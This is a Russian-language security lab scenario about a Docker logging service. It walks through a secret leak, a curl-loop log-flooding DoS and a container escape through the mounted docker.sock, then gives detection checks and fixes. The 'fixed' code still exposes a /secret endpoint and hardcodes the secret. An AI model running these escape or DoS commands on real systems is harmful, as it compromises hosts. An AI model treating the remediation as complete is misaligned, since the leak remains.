## Сценарий B: «Лог-монстр и побег из контейнера»
**Уровень сложности:** продвинутый  
**Суть проблемы:**  
В этой истории вы — сервисный инженер “FinCorp”, отвечающий за централизованный сбор логов. Вам поручили развернуть Logging Service, который принимает GET-запросы и пишет их в файл /logs/app.log на хосте. 
Так же требуется вызывать docker для сбора метаданных контейнеров, ротации логов или запуска вспомогательных контейнеров — поэтому разработчики добавили Docker-клиент в образ.
По ошибке конфигурации:

• контейнер запускают с privileged: true и монтируют /var/run/docker.sock, что даёт полный доступ к Docker-демону хоста;
• логи пишутся в hostPath ./host_logs, без режима read-only;
• не заданы лимиты CPU/памяти, что позволяет устроить DoS;
• логгер выводит все process.env, включая APP_SECRET, — утечка секрета.

## Запуск
- Сборка
```sh
docker-compose up --build -d
```
- Убедитесь, что контейнеры запущены:
```sh
docker ps
```

## Эксплуатация уязвимостей
- Получите секрет через HTTP:
```sh
curl http://localhost:4000/secret
```

- Проверьте эндпоинт логирования и файл, в который записываются логи:
```sh
curl "http://localhost:4000/log?msg=spam"

cat ./host_logs/app.log
```
Должно быть две записи - одна после обращения к секрету и вторая от обращения к логеру

- Устроьте DoS, заполняя логи (чтобы остановить процесс - нажмите CTRL+C)
```sh
while true; do curl "http://localhost:4000/log?msg=spam"; done
```
При достаточно продолжительном DoS файл ./host_logs/app.log может разрастись до очень большого размера и вызвать отказ сервиса

- Побег из контейнера:
Сперва зайти в оболочку контейнера, а затем произведите побег
```sh
docker exec -it labb_logmonster-log-srvc-1 sh

docker run --rm -v /:/host alpine sh -c "echo breakout > /host/tmp/breakout.txt"
```

## Обнаружение
- Проверка привилегий:
```sh
docker inspect labb_logmonster-log-srvc-1 --format '{{ .HostConfig.Privileged }}'
```

- Проверка socket-монтирования:
```sh
 docker inspect labb_logmonster-log-srvc-1 --format '{{ .HostConfig.Binds }}'
```

- Поиск утечки секрета в логах:
```sh
grep APP_SECRET host_logs/app.log
```
- Мониторинг ресурсов (DoS):
```sh
docker stats labb_logmonster-log-srvc-1
```

## Исправления
- Удалить privileged и монтирование Docker-socket и запускать контейнер от непривилегированного пользователя:
Новый `docker-compose` файл ->
```yml
version: '3.8'
services:
  log-srvc:
    build: .
    image: log:latest
    ports:
      - "4000:4000"
    volumes:
    - logs_data:/logs
    environment:
      - APP_SECRET=SuperSecret123
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 256M
volumes:
  logs_data:
```

- Изменить logger.js, чтобы он не включал process.env в логи, а только пользовательское сообщение
```js
const express = require('express');
const fse = require('fs-extra');
const path = require('path');

const app = express();
const LOG_DIR = '/logs';
const LOG_FILE = path.join(LOG_DIR, 'app.log');

fse.ensureDirSync(LOG_DIR);

app.use((req, res, next) => {
  const timestamp = new Date().toISOString();
  const line = `[${timestamp}] PATH=${req.path}\n`;
  fse.appendFileSync(LOG_FILE, line);
  next();
});

app.get('/log', (req, res) => {
  const msg = req.query.msg || '';
  const line = `[${new Date().toISOString()}] MSG=${msg}\n`;
  fse.appendFileSync(LOG_FILE, line);
  res.send('Logged');
});

app.get('/secret', (req, res) => {
  res.send(`SECRET=${process.env.APP_SECRET}`);
});

app.listen(4000, () => console.log('LogMonster listening on 4000'));
```
